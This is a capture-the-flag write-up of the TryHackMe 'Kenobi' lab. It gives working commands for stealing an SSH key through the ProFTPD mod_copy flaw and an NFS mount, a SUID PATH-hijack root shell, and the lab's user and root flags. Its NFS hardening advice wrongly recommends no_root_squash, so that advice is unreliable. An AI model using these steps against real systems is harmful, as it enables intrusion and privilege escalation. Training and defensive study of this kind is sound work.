# Kenobi - TryHackMe Write-up

![Kenobi](https://img.shields.io/badge/Difficulty-Easy-green) ![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue) ![Status](https://img.shields.io/badge/Status-Completed-success)

---

## 📋 Machine Information

| Attribute | Details |
|-----------|---------|
| **Name** | Kenobi |
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu) |
| **IP Address** | 10.65.181.182 |
| **Date Completed** | March 12, 2026 |

---

## 🎯 Learning Objectives

This room teaches:
- SMB enumeration and exploitation
- ProFTPD mod_copy vulnerability
- NFS mounting and file retrieval
- SUID binary exploitation
- PATH variable manipulation for privilege escalation

---

## 🔍 Attack Surface Analysis

### Open Ports & Services

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2049/tcp open  nfs_acl     3 (RPC #100227)
```

### Attack Vectors Identified

```
┌─────────────────────────────────────────┐
│  ATTACK SURFACE                         │
├─────────────────────────────────────────┤
│                                         │
│  21/tcp - ProFTPD 1.3.5                 │
│  ├─ CVE-2015-3306 (mod_copy)            │
│  ├─ Unauthenticated file copy          │
│  └─ SITE CPFR/CPTO commands            │
│                                         │
│  139/445 - Samba                        │
│  ├─ Anonymous share access              │
│  ├─ Information disclosure              │
│  └─ User enumeration                    │
│                                         │
│  2049/tcp - NFS                         │
│  ├─ /var mount exposed                  │
│  ├─ No_root_squash misconfiguration    │
│  └─ File retrieval possible             │
│                                         │
│  SUID Binary                            │
│  ├─ /usr/bin/menu                       │
│  ├─ Runs as root (setuid bit)          │
│  └─ PATH manipulation vulnerable        │
│                                         │
└─────────────────────────────────────────┘
```

### Risk Assessment Matrix

| Vulnerability | Likelihood | Impact | Detectability | Priority |
|---------------|------------|--------|---------------|----------|
| ProFTPD mod_copy | High | Critical | Low | P1 |
| Anonymous SMB | Medium | Medium | High | P2 |
| NFS misconfiguration | Medium | High | Medium | P2 |
| SUID PATH manipulation | Low | Critical | Low | P1 |

---

## 🚀 Exploitation Walkthrough

### Phase 1: Reconnaissance

#### Initial Port Scan

```bash
# Nmap comprehensive scan
nmap -sC -sV -T4 10.65.181.182 -oN nmap_initial.txt
```

**Key Findings:**
- 7 open ports
- ProFTPD 1.3.5 (known vulnerable version)
- SMB service with anonymous access
- NFS service exposing /var directory

#### SMB Enumeration

```bash
# Enumerate SMB shares
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.65.181.182

# enum4linux for detailed enumeration
enum4linux -a 10.65.181.182 | tee enum4linux.txt

# Connect to anonymous share
smbclient //10.65.181.182/anonymous

# Recursive download
smbget -R smb://10.65.181.182/anonymous
```

**Discovered:**
- Share: `anonymous` (read access)
- File: `log.txt`

**Contents of log.txt:**
```
- SSH key generation for user 'kenobi'
- Key location: /home/kenobi/.ssh/id_rsa
- ProFTPD configuration
- Service running as user 'kenobi'
```

#### NFS Enumeration

```bash
# NFS discovery
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.65.181.182
```

**Result:**
- Mount point: `/var`
- Accessible without authentication

---

### Phase 2: Initial Access

#### Vulnerability: ProFTPD 1.3.5 mod_copy

**CVE-2015-3306:** The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files from any part of the filesystem to a chosen destination. Any unauthenticated client can leverage these commands.

```bash
# SearchSploit research
searchsploit proftpd 1.3.5
```

**Exploitation Steps:**

1. **Copy SSH private key to accessible location:**

```bash
# Connect to FTP service
nc 10.65.181.182 21

# Execute mod_copy commands
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

**Server responses:**
```
350 File or directory exists, ready for destination name
250 Copy successful
```

2. **Mount NFS and retrieve the key:**

```bash
# Create mount point
mkdir /mnt/kenobiNFS

# Mount NFS share
sudo mount 10.65.181.182:/var /mnt/kenobiNFS

# Verify mount
ls -la /mnt/kenobiNFS/tmp/

# Copy SSH key
cp /mnt/kenobiNFS/tmp/id_rsa ~/kenobi_id_rsa
chmod 600 ~/kenobi_id_rsa
```

3. **SSH Access:**

```bash
# Connect as kenobi
ssh -i ~/kenobi_id_rsa kenobi@10.65.181.182

# User flag
cat /home/kenobi/user.txt
```

**User Flag:** `d0b0f3f53b6caa532a83915e19224899`

---

### Phase 3: Privilege Escalation

#### SUID Binary Discovery

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
```

**Unusual finding:**
```
/usr/bin/menu
```

#### Binary Analysis

```bash
# Execute the binary
/usr/bin/menu
```

**Output:**
```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

**String analysis:**
```bash
strings /usr/bin/menu
```

**Critical findings:**
```
curl -I localhost
uname -r
ifconfig
```

**Vulnerability:** The binary calls system commands WITHOUT absolute paths:
- ❌ `curl` instead of `/usr/bin/curl`
- ❌ `uname` instead of `/usr/bin/uname`
- ❌ `ifconfig` instead of `/usr/sbin/ifconfig`

This makes it vulnerable to **PATH manipulation**.

#### PATH Hijacking Exploitation

**Concept:** When a SUID binary executes a command without an absolute path, it searches for the binary in directories listed in the `$PATH` environment variable, in order. By prepending a malicious directory to `$PATH`, we can inject our own version of the command.

**Exploitation:**

```bash
# Move to /tmp
cd /tmp

# Create malicious 'curl' binary (actually spawns shell)
echo '/bin/sh' > curl

# Make executable
chmod 777 curl

# Hijack PATH variable
export PATH=/tmp:$PATH

# Verify PATH
echo $PATH
# Output: /tmp:/usr/local/sbin:/usr/local/bin:...

# Execute SUID binary
/usr/bin/menu

# Choose option 1 (calls 'curl')
# → Binary looks for 'curl' in /tmp first
# → Finds our malicious version
# → Executes /bin/sh with root privileges
```

**Result:**
```bash
whoami
# root

id
# uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```

#### Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** `177b3cd8562289f37382721c28381f02`

---

## 🎓 Key Learnings

### 1. ProFTPD mod_copy Vulnerability

**What is it?**
- Introduced in ProFTPD 1.3.5rc3
- Allows unauthenticated file copying
- Commands: `SITE CPFR` (copy from) and `SITE CPTO` (copy to)

**Why is it dangerous?**
- No authentication required
- Can copy ANY file on the filesystem
- Attacker-controlled destination

**Real-world impact:**
- SSH key theft
- Configuration file disclosure
- Sensitive data exfiltration

**Mitigation:**
- Update ProFTPD to version 1.3.5a or later
- Disable mod_copy module if not needed
- Implement authentication for FTP access

### 2. NFS Misconfiguration

**What we exploited:**
- `/var` directory exported without proper restrictions
- No `no_root_squash` limitation
- World-readable mount

**Why is it dangerous?**
- Allows access to sensitive system directories
- Combined with other vulnerabilities (like ProFTPD), enables file retrieval
- Can expose temporary files, logs, and cached data

**Mitigation:**
- Restrict NFS exports to specific IPs/subnets
- Use `no_root_squash` option
- Export only necessary directories
- Implement firewall rules for NFS ports (111, 2049)

### 3. SUID Binary Exploitation via PATH Manipulation

**How it works:**
```
1. SUID binary runs with owner's privileges (root)
2. Binary calls command without absolute path: system("curl ...")
3. System searches $PATH for 'curl'
4. Attacker prepends malicious directory to $PATH
5. Malicious 'curl' found first and executed as root
```

**Why is it dangerous?**
- Leads to immediate privilege escalation
- Difficult to detect without code review
- Common in custom/proprietary binaries

**How to prevent:**
1. **Use absolute paths in code:**
   ```c
   // Bad
   system("curl -I localhost");
   
   // Good
   system("/usr/bin/curl -I localhost");
   ```

2. **Sanitize environment variables:**
   ```c
   // Reset PATH before executing
   putenv("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
   system("curl -I localhost");
   ```

3. **Use execve() with explicit paths:**
   ```c
   char *argv[] = {"/usr/bin/curl", "-I", "localhost", NULL};
   execve("/usr/bin/curl", argv, NULL);
   ```

**Detection methods:**
- SUID binary auditing: `find / -perm -4000 -type f`
- Code review with static analysis tools
- Monitor for suspicious PATH modifications

---

## 🛡️ Remediation Recommendations

### Critical (P1)

1. **Update ProFTPD**
   ```bash
   apt-get update
   apt-get install proftpd=1.3.5a-1build1 or later
   ```

2. **Fix SUID binary**
   - Review `/usr/bin/menu` source code
   - Implement absolute paths for all system calls
   - Remove SUID bit if not required: `chmod u-s /usr/bin/menu`

### High (P2)

3. **Secure NFS Configuration**
   - Edit `/etc/exports`:
   ```
   /var 192.168.1.0/24(ro,sync,no_root_squash)
   ```
   - Restart NFS: `systemctl restart nfs-kernel-server`

4. **Disable SMB Anonymous Access**
   - Edit `/etc/samba/smb.conf`:
   ```
   [anonymous]
   guest ok = no
   ```
   - Restart Samba: `systemctl restart smbd`

### Medium (P3)

5. **Implement Network Segmentation**
   - Place FTP, SMB, NFS behind firewall
   - Allow only trusted IPs

6. **Enable Logging and Monitoring**
   - Configure centralized logging
   - Monitor for failed authentication attempts
   - Alert on SUID binary executions

---

## 🔧 Tools Used

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Port scanning & service enumeration | `nmap -sC -sV -T4 [IP]` |
| enum4linux | SMB enumeration | `enum4linux -a [IP]` |
| smbclient | SMB share access | `smbclient //[IP]/share` |
| smbget | Recursive SMB download | `smbget -R smb://[IP]/share` |
| netcat | FTP connection | `nc [IP] 21` |
| searchsploit | Exploit database search | `searchsploit proftpd 1.3.5` |
| mount | NFS mounting | `mount [IP]:/var /mnt/dir` |
| ssh | Remote shell access | `ssh -i key user@[IP]` |
| find | SUID binary discovery | `find / -perm -u=s -type f` |
| strings | Binary analysis | `strings /path/to/binary` |

---

## References

- [CVE-2015-3306 - ProFTPD mod_copy](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
- [ProFTPD Vulnerability Disclosure](http://www.proftpd.org/docs/RELEASE_NOTES-1.3.5)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [GTFOBins - SUID Exploitation](https://gtfobins.github.io/)
- [Linux Privilege Escalation Techniques](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

---

## Timeline do Ataque

```
00:00 - Initial reconnaissance (Nmap)
00:15 - SMB enumeration (enum4linux, smbclient)
00:30 - Information gathering from log.txt
00:45 - NFS enumeration
01:00 - ProFTPD vulnerability research
01:15 - Exploitation (SITE CPFR/CPTO)
01:30 - NFS mount and SSH key retrieval
01:45 - Initial access as kenobi
02:00 - SUID binary enumeration
02:15 - Binary analysis (strings)
02:30 - PATH manipulation exploitation
02:45 - Root access achieved
03:00 - Documentation and reporting
```
**Tempo total de comprometimento:** ~3 hours

---

## 🎯 Flags

```
User Flag: d0b0f3f53b6caa532a83915e19224899
Root Flag: 177b3cd8562289f37382721c28381f02
```

---

## Final Thoughts

This room provides an excellent introduction to:
- **Service exploitation** (ProFTPD)
- **Information disclosure** (SMB anonymous shares)
- **File system vulnerabilities** (NFS misconfigurations)
- **Privilege escalation** (SUID + PATH manipulation)

The attack chain demonstrates how multiple low/medium severity vulnerabilities can be chained together to achieve full system compromise. This is a realistic scenario commonly found in corporate environments.

**Key Takeaway:** Security is only as strong as the weakest link. Proper configuration and regular patching are essential.

---

**Author:** Igor Leite  
**Date:** 12 March 2026
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Status:** ✅ Completed

---

**If you found this write-up helpful, please give it a ⭐ on GitHub!**

**Happy Hacking! 💊🐇**